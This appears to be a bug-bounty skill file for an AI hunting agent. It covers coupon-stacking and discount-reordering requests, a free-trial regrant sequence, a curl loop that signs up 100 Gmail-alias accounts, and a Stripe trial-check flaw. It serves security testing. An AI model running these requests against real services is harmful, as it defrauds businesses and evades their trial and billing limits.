---
name: coupon-trial-discount-abuse
description: coupon-trial-discount-abuse reference material.
---

# Coupon / Discount / Free-Trial Abuse

Part of `skills/hunt-business-logic/SKILL.md`. Read this ONLY when the target has a coupon/promo-code system OR a free-trial / cancel-resubscribe subscription flow.

---

### Sub-technique B — Coupon / discount stacking

```http
# Apply same coupon repeatedly
POST /api/cart/coupon HTTP/1.1
{"code": "SAVE20"}

POST /api/cart/coupon HTTP/1.1
{"code": "SAVE20"}     # same code again — does it stack?

POST /api/cart/coupon HTTP/1.1
{"code": "SAVE20"}     # third time

# Apply multiple distinct coupons when UI shows only one allowed
POST /api/cart/coupon
{"code": "SAVE20"}
POST /api/cart/coupon
{"code": "FREESHIP"}
POST /api/cart/coupon
{"code": "BLACKFRIDAY"}

# Reorder discount application (changes calculated total when % vs fixed)
POST /api/cart/coupon  {"code": "FIXED10"}     # apply $10 off first
POST /api/cart/coupon  {"code": "PERCENT20"}   # then 20% off — applies to discounted-price
# vs
POST /api/cart/coupon  {"code": "PERCENT20"}   # 20% off first
POST /api/cart/coupon  {"code": "FIXED10"}     # then $10 off — applies to original-price
```

### Sub-technique E — Free-trial / subscription abuse

```
# Doppler pattern (Aditya Sunny Dec 2024)
1. Sign up for new account
2. Activate 14-day free trial (premium features)
3. Cancel trial early → switch to free Developer Mode
4. Use developer tools to switch back to paid Team Mode
5. Premium features regranted indefinitely without payment

# Email-alias unlimited trial (Mahmoud Magdy Dec 2025)
# Gmail aliases: user+anything@gmail.com all deliver to user@gmail.com
# Most apps treat as distinct registrations
for i in $(seq 1 100); do
  curl -X POST https://target/api/signup -d "{
    \"email\":\"user+trial$i@gmail.com\",
    \"password\":\"Test123!\"
  }"
done
# 100 trials, 1 mailbox

# Gmail dot variants (also same inbox)
user@gmail.com
u.ser@gmail.com
us.er@gmail.com
u.s.er@gmail.com
# All deliver to user@gmail.com but app sees as distinct

# @googlemail.com vs @gmail.com — same Google inbox
user@gmail.com
user@googlemail.com

# Stripe hasEverTrialed bypass (better-auth #6863 Dec 2025)
# Trigger condition: user has multiple subscription records (one canceled with trial history,
# one new incomplete). findOne returns whichever DB returns first; if it's the new
# incomplete one, hasEverTrialed returns false → trial granted again
```

